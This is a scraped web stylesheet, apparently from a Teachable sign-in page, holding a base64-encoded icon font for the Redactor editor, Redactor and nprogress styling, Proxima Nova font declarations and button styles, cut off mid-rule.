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") format("woff"); font-weight: normal; font-style: normal; }

.redactor-box { position: relative; overflow: visible; margin-bottom: 24px; }

.redactor-box textarea { display: block; position: relative; margin: 0px; padding: 0px; width: 100%; overflow: auto; outline: none; border: none; background-color: rgb(17, 17, 17); box-shadow: none; color: rgb(204, 204, 204); font-size: 13px; resize: none; font-family: Menlo, Monaco, monospace, sans-serif !important; }

.redactor-box textarea:focus { outline: none; }

.redactor-editor, .redactor-box { background: rgb(255, 255, 255); }

.redactor-editor, .redactor-box, .redactor-box textarea { z-index: auto; }

.redactor-box-fullscreen { z-index: 1051; }

.redactor-toolbar { z-index: 100; }

.redactor-dropdown { z-index: 2000; }

#redactor-modal-overlay, #redactor-modal-box, #redactor-modal { z-index: 1053; }

body .redactor-box-fullscreen { position: fixed; top: 0px; left: 0px; width: 100%; }

.redactor-scrollbar-measure { position: absolute; top: -9999px; width: 50px; height: 50px; overflow: scroll; }

.redactor-editor { position: relative; overflow: auto; padding: 20px; min-height: 80px; outline: none; white-space: normal; border: 1px solid rgb(238, 238, 238); font-size: 14px; line-height: 1.6em; margin: 0px !important; font-family: Arial, Helvetica, Verdana, Tahoma, sans-serif !important; }

.redactor-editor:focus { outline: none; }

.toolbar-fixed-box + .redactor-editor { padding-top: 32px !important; }

.redactor-placeholder::after { position: absolute; top: 20px; left: 20px; content: attr(placeholder); display: block; color: rgb(153, 153, 153) !important; font-weight: normal !important; }

.redactor-toolbar { position: relative; top: 0px; left: 0px; background: rgb(255, 255, 255); border: none; box-shadow: rgba(0, 0, 0, 0.2) 0px 1px 2px; margin: 0px !important; padding: 0px !important; list-style: none !important; font-size: 14px !important; line-height: 1 !important; }

.redactor-toolbar::after { content: ""; display: table; clear: both; }

.redactor-toolbar.redactor-toolbar-overflow { overflow-y: auto; height: 29px; white-space: nowrap; }

.redactor-toolbar.redactor-toolbar-external { z-index: 999; box-shadow: none; border: 1px solid rgba(0, 0, 0, 0.1); }

.redactor-toolbar li { vertical-align: top; display: inline-block; outline: none; box-sizing: content-box; margin: 0px !important; padding: 0px !important; list-style: none !important; }

.redactor-toolbar li a { display: block; color: rgb(51, 51, 51); text-align: center; padding: 9px 10px; outline: none; border: none; text-decoration: none; cursor: pointer; zoom: 1; box-sizing: content-box; }

.redactor-toolbar li a:hover { outline: none; background-color: rgb(31, 120, 216); color: rgb(255, 255, 255); }

.redactor-toolbar li a:hover i::before { color: rgb(255, 255, 255); }

.redactor-toolbar li a:active, .redactor-toolbar li a.redactor-act { outline: none; background-color: rgb(204, 204, 204); color: rgb(68, 68, 68); }

.redactor-toolbar li a.redactor-btn-image { width: 14px; height: 14px; background-position: center center; background-repeat: no-repeat; }

.redactor-toolbar li a.fa-redactor-btn { display: inline-block; padding: 9px 10px 8px; line-height: 1; }

.redactor-toolbar li a.redactor-button-disabled { opacity: 0.3; }

.redactor-toolbar li a.redactor-button-disabled:hover { color: rgb(51, 51, 51); outline: none; cursor: default; background-color: transparent !important; }

.redactor-toolbar li a.redactor-button-focus { color: rgb(255, 255, 255); background: rgb(0, 0, 0); }

.redactor-box .CodeMirror { display: none; }

.re-icon { font-family: RedactorFont; speak: none; font-style: normal; font-weight: normal; font-variant: normal; text-transform: none; line-height: 1; -webkit-font-smoothing: antialiased; }

.re-icon i::before { position: relative; font-size: 14px; }

.re-video::before { content: ""; }

.re-unorderedlist::before { content: ""; }

.re-undo::before { content: ""; }

.re-underline::before { content: ""; }

.re-textdirection::before { content: ""; }

.re-fontcolor::before { content: ""; }

.re-table::before { content: ""; }

.re-redo::before { content: ""; }

.re-quote::before { content: ""; }

.re-outdent::before { content: ""; }

.re-orderedlist::before { content: ""; }

.re-link::before { content: ""; }

.re-horizontalrule::before { content: ""; }

.re-italic::before { content: ""; }

.re-indent::before { content: ""; }

.re-image::before { content: ""; }

.re-fullscreen::before { content: ""; }

.re-normalscreen::before { content: ""; }

.re-formatting::before { content: ""; }

.re-fontsize::before { content: ""; }

.re-fontfamily::before { content: ""; }

.re-deleted::before { content: ""; }

.re-html::before { content: ""; }

.re-clips::before { content: ""; }

.re-bold::before { content: ""; }

.re-backcolor::before { content: ""; }

.re-file::before { content: ""; }

.re-alignright::before { content: ""; }

.re-alignment::before, .re-alignleft::before { content: ""; }

.re-alignjustify::before { content: ""; }

.re-aligncenter::before { content: ""; }

.re-gallery::before { content: ""; }

.redactor-toolbar-tooltip { position: absolute; z-index: 1054; text-align: center; top: 0px; left: 0px; background: rgb(0, 0, 0); color: rgb(255, 255, 255); padding: 5px 8px; line-height: 1; font-size: 12px; border-radius: 2px; font-family: Arial, Helvetica, Verdana, Tahoma, sans-serif !important; }

.redactor-dropdown { position: absolute; top: 28px; left: 0px; padding: 0px; min-width: 220px; max-height: 254px; overflow: auto; background-color: rgb(255, 255, 255); box-shadow: rgba(0, 0, 0, 0.25) 0px 1px 7px; font-size: 14px; line-height: 1.6em; font-family: Arial, Helvetica, Verdana, Tahoma, sans-serif !important; }

.redactor-dropdown a { display: block; padding: 10px 15px; color: rgb(0, 0, 0); text-decoration: none; border-bottom: 1px solid rgba(0, 0, 0, 0.07); }

.redactor-dropdown a:last-child { border-bottom: none; }

.redactor-dropdown a:hover { background-color: rgb(31, 120, 216); text-decoration: none; color: rgb(255, 255, 255) !important; }

.redactor-dropdown a.selected { background-color: rgb(0, 0, 0); color: rgb(255, 255, 255); }

.redactor-dropdown a.redactor-dropdown-link-inactive, .redactor-dropdown a.redactor-dropdown-link-inactive:hover { background: none; cursor: default; opacity: 0.4; color: rgb(0, 0, 0) !important; }

.redactor-dropdown a.redactor-dropdown-link-selected { color: rgb(255, 255, 255); background: rgb(0, 0, 0); }

#redactor-image-box { position: relative; max-width: 100%; display: inline-block; line-height: 0; outline: rgba(0, 0, 0, 0.6) dashed 1px; }

#redactor-image-editter { position: absolute; z-index: 5; top: 50%; left: 50%; margin-top: -11px; margin-left: -18px; line-height: 1; background-color: rgb(0, 0, 0); color: rgb(255, 255, 255); font-size: 11px; padding: 7px 10px; cursor: pointer; }

#redactor-image-resizer { position: absolute; z-index: 2; line-height: 1; cursor: nw-resize; bottom: -4px; right: -5px; border: 1px solid rgb(255, 255, 255); background-color: rgb(0, 0, 0); width: 8px; height: 8px; }

.redactor-link-tooltip { position: absolute; z-index: 99; padding: 10px; line-height: 1; display: inline-block; background-color: rgb(0, 0, 0); color: rgb(85, 85, 85) !important; }

.redactor-link-tooltip, .redactor-link-tooltip a { font-size: 12px; font-family: Arial, Helvetica, Verdana, Tahoma, sans-serif !important; }

.redactor-link-tooltip a { color: rgb(204, 204, 204); margin: 0px 5px; text-decoration: none; }

.redactor-link-tooltip a:hover { color: rgb(255, 255, 255); }

#redactor-droparea { position: relative; overflow: hidden; padding: 140px 20px; border: 3px dashed rgba(0, 0, 0, 0.1); }

#redactor-droparea.drag-hover { background: rgba(200, 222, 250, 0.75); }

#redactor-droparea.drag-drop { background: rgba(250, 248, 200, 0.5); }

#redactor-droparea-placeholder { text-align: center; font-size: 12px; color: rgba(0, 0, 0, 0.7); }

#redactor-progress { position: fixed; top: 0px; left: 0px; width: 100%; z-index: 1000000; height: 10px; }

#redactor-progress span { display: block; width: 100%; height: 100%; background-color: rgb(61, 88, 168); background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.2) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.2) 50%, rgba(255, 255, 255, 0.2) 75%, transparent 75%, transparent); animation: 2s linear 0s infinite normal none running progress-bar-stripes; background-size: 40px 40px; }

@-webkit-keyframes progress-bar-stripes { 
  0% { background-position: 40px 0px; }
  100% { background-position: 0px 0px; }
}

@keyframes progress-bar-stripes { 
  0% { background-position: 40px 0px; }
  100% { background-position: 0px 0px; }
}

#redactor-modal-overlay { position: fixed; top: 0px; left: 0px; margin: auto; overflow: auto; width: 100%; height: 100%; opacity: 0.3; background-color: rgb(0, 0, 0) !important; }

#redactor-modal-box { position: fixed; inset: 0px; overflow: hidden auto; }

#redactor-modal { outline: 0px; position: relative; margin: auto auto 20px; padding: 0px; background: rgb(255, 255, 255); color: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.5) 0px 1px 70px; font-size: 14px !important; font-family: Arial, Helvetica, Verdana, Tahoma, sans-serif !important; }

#redactor-modal header { padding: 30px 40px 5px; font-size: 18px; font-weight: bold; }

#redactor-modal section { padding: 30px 40px 50px; }

#redactor-modal label { display: block; padding: 0px; float: none !important; margin: 15px 0px 3px !important; }

#redactor-modal input[type="radio"], #redactor-modal input[type="checkbox"] { position: relative; top: -1px; }

#redactor-modal select { width: 100%; }

#redactor-modal input[type="text"], #redactor-modal input[type="password"], #redactor-modal input[type="email"], #redactor-modal input[type="url"], #redactor-modal textarea { position: relative; z-index: 2; margin: 0px; padding: 5px 4px; height: 28px; border: 1px solid rgb(204, 204, 204); border-radius: 1px; background-color: white; box-shadow: rgba(0, 0, 0, 0.2) 0px 1px 2px inset; color: rgb(51, 51, 51); width: 100%; font-size: 14px; transition: border 0.3s ease-in 0s; font-family: Arial, Helvetica, Verdana, Tahoma, sans-serif !important; }

#redactor-modal input[type="text"]:focus, #redactor-modal input[type="password"]:focus, #redactor-modal input[type="email"]:focus, #redactor-modal input[type="url"]:focus, #redactor-modal textarea:focus { outline: none; border-color: rgb(92, 169, 228); box-shadow: rgba(70, 161, 231, 0.3) 0px 0px 0px 2px, rgba(0, 0, 0, 0.2) 0px 1px 2px inset; }

#redactor-modal input.redactor-input-error[type="text"], #redactor-modal input.redactor-input-error[type="password"], #redactor-modal input.redactor-input-error[type="email"], #redactor-modal input.redactor-input-error[type="url"], #redactor-modal textarea.redactor-input-error { border-color: rgb(232, 47, 47); box-shadow: rgba(232, 47, 47, 0.3) 0px 0px 0px 2px, rgba(0, 0, 0, 0.2) 0px 1px 2px inset; }

#redactor-modal textarea { display: block; margin-top: 4px; line-height: 1.4em; }

#redactor-modal-tabber { margin-bottom: 15px; font-size: 12px; }

#redactor-modal-tabber a { border: 1px solid rgb(221, 221, 221); line-height: 1; padding: 8px 15px; margin-right: -1px; text-decoration: none; color: rgb(0, 0, 0); }

#redactor-modal-tabber a:hover { background-color: rgb(31, 120, 216); border-color: rgb(31, 120, 216); color: rgb(255, 255, 255); }

#redactor-modal-tabber a.active { cursor: default; background-color: rgb(221, 221, 221); border-color: rgb(221, 221, 221); color: rgba(0, 0, 0, 0.6); }

#redactor-modal #redactor-modal-list { margin-left: 0px; padding-left: 0px; list-style: none; max-height: 250px; overflow-x: auto; }

#redactor-modal #redactor-modal-list li { border-bottom: 1px solid rgb(221, 221, 221); }

#redactor-modal #redactor-modal-list li:last-child { border-bottom: none; }

#redactor-modal #redactor-modal-list a { padding: 10px 5px; color: rgb(0, 0, 0); text-decoration: none; font-size: 13px; display: block; position: relative; }

#redactor-modal #redactor-modal-list a:hover { background-color: rgb(238, 238, 238); }

#redactor-modal-close { position: absolute; top: 10px; right: 10px; width: 30px; height: 30px; text-align: right; color: rgb(187, 187, 187); font-size: 30px; font-weight: 300; cursor: pointer; appearance: none; padding: 0px; border: 0px; background: 0px center; outline: none; }

#redactor-modal-close:hover { color: rgb(0, 0, 0); }

#redactor-modal footer button { position: relative; width: 100%; padding: 14px 16px; margin: 0px; outline: none; border: none; background-color: rgb(221, 221, 221); color: rgb(0, 0, 0); text-align: center; text-decoration: none; font-weight: normal; font-size: 12px; line-height: 1; cursor: pointer; font-family: Arial, Helvetica, Verdana, Tahoma, sans-serif !important; }

#redactor-modal footer button:hover { color: rgb(119, 119, 119); background: rgb(187, 187, 187); text-decoration: none; }

#redactor-modal footer button.redactor-modal-delete-btn { background: none rgb(181, 37, 37); color: rgb(255, 255, 255); }

#redactor-modal footer button.redactor-modal-delete-btn:hover { color: rgba(255, 255, 255, 0.6); background-color: rgb(136, 27, 27); }

#redactor-modal footer button.redactor-modal-action-btn { background: none rgb(36, 97, 181); color: rgb(255, 255, 255); }

#redactor-modal footer button.redactor-modal-action-btn:hover { color: rgba(255, 255, 255, 0.6); background-color: rgb(26, 69, 128); }

.redactor-dropdown .redactor-formatting-blockquote { color: rgba(0, 0, 0, 0.4); font-style: italic; }

.redactor-dropdown .redactor-formatting-pre { font-family: monospace, sans-serif; }

.redactor-dropdown .redactor-formatting-h1 { font-size: 36px; line-height: 36px; font-weight: bold; }

.redactor-dropdown .redactor-formatting-h2 { font-size: 24px; line-height: 36px; font-weight: bold; }

.redactor-dropdown .redactor-formatting-h3 { font-size: 21px; line-height: 30px; font-weight: bold; }

.redactor-dropdown .redactor-formatting-h4 { font-size: 18px; line-height: 26px; font-weight: bold; }

.redactor-dropdown .redactor-formatting-h5 { font-size: 16px; line-height: 23px; font-weight: bold; }

.redactor-editor code, .redactor-editor pre { cursor: text; font-family: Menlo, Monaco, monospace, sans-serif !important; }

.redactor-editor div, .redactor-editor p, .redactor-editor ul, .redactor-editor ol, .redactor-editor table, .redactor-editor dl, .redactor-editor blockquote, .redactor-editor pre { font-size: 14px; line-height: 1.6em; }

.redactor-editor a { color: rgb(17, 85, 204); text-decoration: underline; }

.redactor-editor object, .redactor-editor embed, .redactor-editor video, .redactor-editor img { max-width: 100%; width: auto; }

.redactor-editor video, .redactor-editor img { height: auto; }

.redactor-editor div, .redactor-editor p, .redactor-editor ul, .redactor-editor ol, .redactor-editor table, .redactor-editor dl, .redactor-editor figure, .redactor-editor blockquote, .redactor-editor pre { margin: 0px 0px 15px; border: none; background: none; box-shadow: none; }

.redactor-editor iframe, .redactor-editor object, .redactor-editor hr { margin-bottom: 15px; }

.redactor-editor blockquote { padding: 0px; text-align: left; color: rgb(119, 119, 119); font-style: italic; margin-left: 1.6em !important; }

.redactor-editor blockquote::before, .redactor-editor blockquote::after { content: ""; }

.redactor-editor ul, .redactor-editor ol { padding-left: 2em; }

.redactor-editor ul ul, .redactor-editor ol ol, .redactor-editor ul ol, .redactor-editor ol ul { margin: 2px; padding: 0px 0px 0px 2em; border: none; }

.redactor-editor ol ol li { list-style-type: lower-alpha; }

.redactor-editor ol ol ol li { list-style-type: lower-roman; }

.redactor-editor dl dt { font-weight: bold; }

.redactor-editor dd { margin-left: 1em; }

.redactor-editor table { border-collapse: collapse; font-size: 1em; width: 100%; }

.redactor-editor table td, .redactor-editor table th { padding: 5px; border: 1px solid rgb(221, 221, 221); vertical-align: top; }

.redactor-editor table thead td, .redactor-editor table th { font-weight: bold; border-bottom-color: rgb(136, 136, 136); }

.redactor-editor code { background-color: rgb(216, 215, 215); }

.redactor-editor pre { padding: 1em; border: 1px solid rgb(221, 221, 221); border-radius: 3px; background: rgb(248, 248, 248); font-size: 90%; }

.redactor-editor hr { display: block; height: 1px; border-width: 1px 0px 0px; border-right-style: initial; border-bottom-style: initial; border-left-style: initial; border-right-color: initial; border-bottom-color: initial; border-left-color: initial; border-image: initial; border-top-style: solid; border-top-color: rgb(204, 204, 204); }

.redactor-editor h1, .redactor-editor h2, .redactor-editor h3, .redactor-editor h4, .redactor-editor h5, .redactor-editor h6 { font-weight: bold; color: rgb(0, 0, 0); padding: 0px; background: none; text-rendering: optimizelegibility; margin: 0px 0px 0.5em; }

.redactor-editor h1, .redactor-editor h2, .redactor-editor h3, .redactor-editor h4 { line-height: 1.3; }

.redactor-editor h1 { font-size: 36px; }

.redactor-editor h2 { font-size: 24px; margin-bottom: 0.7em; }

.redactor-editor h3 { font-size: 21px; }

.redactor-editor h4 { font-size: 18px; }

.redactor-editor h5 { font-size: 16px; }

.redactor-editor h6 { font-size: 12px; text-transform: uppercase; }

#nprogress { pointer-events: none; }

#nprogress .bar { background: rgb(30, 166, 154); position: fixed; z-index: 100; top: 0px; left: 0px; width: 100%; height: 2px; }

#nprogress .peg { display: block; position: absolute; right: 0px; width: 100px; height: 100%; box-shadow: rgb(30, 166, 154) 0px 0px 10px, rgb(30, 166, 154) 0px 0px 5px; opacity: 1; transform: rotate(3deg) translate(0px, -4px); }

#nprogress .spinner { display: block; position: fixed; z-index: 100; top: 15px; right: 15px; }

#nprogress .spinner-icon { width: 18px; height: 18px; box-sizing: border-box; border-width: 2px; border-style: solid; border-color: rgb(255, 255, 255) transparent transparent rgb(255, 255, 255); border-image: initial; border-radius: 50%; animation: 400ms linear 0s infinite normal none running nprogress-spinner; }

.nprogress-custom-parent { overflow: hidden; position: relative; }

.nprogress-custom-parent #nprogress .spinner, .nprogress-custom-parent #nprogress .bar { position: absolute; }

@-webkit-keyframes nprogress-spinner { 
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

@keyframes nprogress-spinner { 
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

#nprogress .bar, #nprogress .spinner { z-index: 999999; }

@font-face { font-family: Proxima; src: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-regular-webfont.eot?iefix") format("eot"), url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-regular-webfont.woff?1307578394") format("woff"), url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-regular-webfont.ttf?1307578394") format("truetype"), url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-regular-webfont.svg#webfont2rpW2ohz") format("svg"); font-display: swap; }

@font-face { font-family: Proxima; font-style: italic; src: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-regitalic-webfont.eot?iefix") format("eot"), url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-regitalic-webfont.woff?1307578394") format("woff"), url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-regitalic-webfont.ttf?1307578394") format("truetype"), url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-regitalic-webfont.svg#webfont2rpW2ohz") format("svg"); font-display: swap; }

@font-face { font-family: Proxima; font-weight: 300; src: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-light-webfont.eot?iefix") format("eot"), url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-light-webfont.woff?1307578394") format("woff"), url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-light-webfont.ttf?1307578394") format("truetype"), url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-light-webfont.svg#webfont2rpW2ohz") format("svg"); font-display: swap; }

@font-face { font-family: Proxima; font-weight: 600; src: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-semibold-webfont.eot?iefix") format("eot"), url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-semibold-webfont.woff?1307578394") format("woff"), url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-semibold-webfont.ttf?1307578394") format("truetype"), url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-semibold-webfont.svg#webfont2rpW2ohz") format("svg"); font-display: swap; }

@font-face { font-family: Proxima; font-weight: 600; font-style: italic; src: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-semibolditalic-webfont.eot?iefix") format("eot"), url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-semibolditalic-webfont.woff?1307578394") format("woff"), url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-semibolditalic-webfont.ttf?1307578394") format("truetype"), url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-semibolditalic-webfont.svg#webfont2rpW2ohz") format("svg"); font-display: swap; }

@font-face { font-family: Proxima; font-weight: bold; src: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-bold-webfont.eot?iefix") format("eot"), url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-bold-webfont.woff?1307578394") format("woff"), url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-bold-webfont.ttf?1307578394") format("truetype"), url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-bold-webfont.svg#webfont2rpW2ohz") format("svg"); font-display: swap; }

@font-face { font-family: Proxima; font-weight: bold; font-style: italic; src: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-boldit-webfont.eot?iefix") format("eot"), url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-boldit-webfont.woff?1307578394") format("woff"), url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-boldit-webfont.ttf?1307578394") format("truetype"), url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-boldit-webfont.svg#webfont2rpW2ohz") format("svg"); font-display: swap; }

@font-face { font-family: Proxima; font-weight: 900; src: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-extrabold-webfont.eot?iefix") format("eot"), url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-extrabold-webfont.woff?1307578394") format("woff"), url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-extrabold-webfont.ttf?1307578394") format("truetype"), url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/proxima-nova/proximanova-extrabold-webfont.svg#webfont2rpW2ohz") format("svg"); font-display: swap; }

.btn-primary, .btn-primary:active, .btn-primary:focus { color: rgb(255, 255, 255); border-radius: 20px; background: rgb(30, 166, 154) !important; border: 1px solid rgb(30, 166, 154) !important; font-weight: 600 !important; outline: none !important; padding: 3px 18px !important; }

.btn-primary:hover, .btn-primary:focus, .btn-primary:active:hover, .btn-primary:active:focus, .btn-primary:focus:hover, .btn-primary:focus:focus { text-decoration: none; color: rgb(255, 255, 255); outline: none !important; background: rgb(26, 144, 134) !important; border: 1px solid rgb(26, 144, 134) !important; }

@media screen and (max-width: 767px) {
  .btn-primary, .btn-primary:active, .btn-primary:focus { font-size: 15px; }
}

.btn-primary img, .btn-primary:active img, .btn-primary:focus img { margin-right: 10px; }

.btn-secondary, .btn-secondary:active, .btn-secondary:focus { color: rgb(255, 255, 255); border-radius: 20px; background: rgb(102, 102, 102) !important; border: 1px solid rgb(102, 102, 102) !important; font-weight: 600 !important; outline: none !important; padding: 3px 18px !important; }

.btn-secondary:hover, .btn-secondary:focus, .btn-secondary:active:hover, .btn-secondary:active:focus, .btn-secondary:focus:hover, .btn-secondary:focus:focus { text-decoration: none; color: rgb(255, 255, 255); outline: none !important; background: rgb(89, 89, 89) !important; border: 1px solid rgb(89, 89, 89) !important; }

@media screen and (max-width: 767px) {
